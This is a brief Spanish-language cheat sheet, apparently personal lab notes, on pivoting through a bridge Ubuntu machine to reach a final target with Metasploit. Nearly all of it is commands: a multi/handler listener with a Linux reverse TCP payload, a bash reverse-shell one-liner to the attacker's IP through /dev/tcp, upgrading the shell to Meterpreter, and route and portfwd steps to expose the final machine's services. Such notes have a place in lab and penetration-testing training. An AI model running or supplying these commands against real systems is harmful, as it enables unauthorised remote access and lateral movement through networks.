---

---
----------------
- Tags: #pivoting #msfv #payload 
-----------------

- Maquina Atacante *Parrot Nativo*
- Maquina Puente Ubuntu
- Maquina Final Rijaba2

-------------

En maquina atacante:
```bash
msfconsole
use /multi/handler

set LHOST
set Payload linux/x86/shell_reverse_tcp
```

------------

- Maquina Puente
```bash
sh -i >& /dev/tcp/IpAtacante/Port 0>&1
```

----------------------
- ## Metasploit Shell to Meterpreter
```bash
ctrl + z
sessions -l

use shell_to_meterpreter
show options
set SESSION IdSession
run

session -l
session -i IdSessionMeterpreter
```

--------------
# PortForwarding
```bash
ipconfig
ctrl + z

route add 2daInterfaz 255.255.255.0 IdSessionMeter

sessions -l
session -i IdSessionMeterpreter

portfwd add -l 5000(Maquina Atacante) -p 80(MaquinaFinal) -r IpFinal 
```

--------------------------------
## Listo Para usar
Ejemplos:
ftp 127.0.0.1:1234
http://127.0.0.1:5000

---------------


---


